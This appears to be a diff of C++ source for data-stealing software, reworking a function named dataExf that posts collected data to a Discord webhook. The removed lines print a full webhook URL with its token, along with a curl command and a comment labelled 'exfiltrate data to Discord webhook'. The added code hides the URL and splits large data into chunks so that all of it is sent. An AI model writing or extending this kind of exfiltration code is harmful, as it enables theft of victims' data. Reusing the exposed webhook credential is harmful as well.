@@ -113,32 +113,57 @@ namespace OutsideTheBox {
     return mapsLink;
   }
 
-  CURLcode dataExf(CURL* hnd, std::string data) {
-    /* EXFILTRATE DATA TO DISCORD WEBHOOK
-     * curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"You know what will happen next x)\"}" https://discord.com/api/webhooks/1328822483205357679/KyaxDb1Q1GRUYPUOlsY-0GlIQVizwZ2iGnG7dsxuKOOtWO6afkt-riFf2D8vc4a2IiGd
-    */
-    CURLcode ret;
-    const std::string leftAppliance {"{\"content\": \""};
-    const std::string rightAppliance {"\"}"};
-    std::string json = leftAppliance + data + rightAppliance;
+  void truncateData(std::string *dataSector, std::string data, int start, unsigned short int sectorSize) {
+    *dataSector = data.substr(start, sectorSize);
+  }
 
-    std::cout << "\n\n\ndata : " << data << "\n\n\n";
-    std::cout << "\n\n\njson : " << json << "\n\n\n";
-    
+  CURLcode dataExf(CURL* hnd, std::string data) {
+    CURLcode ret;
+
+    // CURL config
     struct curl_slist *headerList = NULL;
 
     headerList = curl_slist_append(headerList, "Accept: application/json");
     headerList = curl_slist_append(headerList, "Content-Type:application/json");
-
     curl_easy_setopt(hnd, CURLOPT_HTTPHEADER, headerList);
 
-    curl_easy_setopt(hnd, CURLOPT_URL, "https://discord.com/api/webhooks/1328822483205357679/KyaxDb1Q1GRUYPUOlsY-0GlIQVizwZ2iGnG7dsxuKOOtWO6afkt-riFf2D8vc4a2IiGd");
+    curl_easy_setopt(hnd, CURLOPT_URL, "[REDACTED]");
     curl_easy_setopt(hnd, CURLOPT_VERBOSE, 1);
-
     curl_easy_setopt(hnd, CURLOPT_POST, true);
-    curl_easy_setopt(hnd, CURLOPT_POSTFIELDS, json.c_str());
 
-    ret = curl_easy_perform(hnd);
+    const std::string leftAppliance {"{\"content\": \""};
+    const std::string rightAppliance {"\"}"};
+    
+    unsigned const short int MAX_DATA_LENGTH {1985};
+    const size_t dataSize {data.size()};
+
+
+    std::vector<std::string> dataSectors{};
+    
+    // TRUNCATE THE DATA ONLY IF NECESSARY
+    if (dataSize > MAX_DATA_LENGTH) {
+      std::string dataSector {""};
+      size_t iloc {0};
+      size_t start {iloc * MAX_DATA_LENGTH};
+
+      // TRUNCATING THE DATA
+      while (start < dataSize) {
+        truncateData(&dataSector, data, start, MAX_DATA_LENGTH);
+        dataSectors.push_back(dataSector);
+
+        start += MAX_DATA_LENGTH;
+        iloc++;
+      }
+    } else {
+      dataSectors.push_back(data);
+    }
+    
+    // SENDING THE SECTORS
+    for (int i {0}; i < dataSectors.size(); i++) {
+      std::string json = leftAppliance + dataSectors[i] + rightAppliance;
+      curl_easy_setopt(hnd, CURLOPT_POSTFIELDS, json.c_str());
+      ret = curl_easy_perform(hnd);
+    }
 
     return ret;
   }
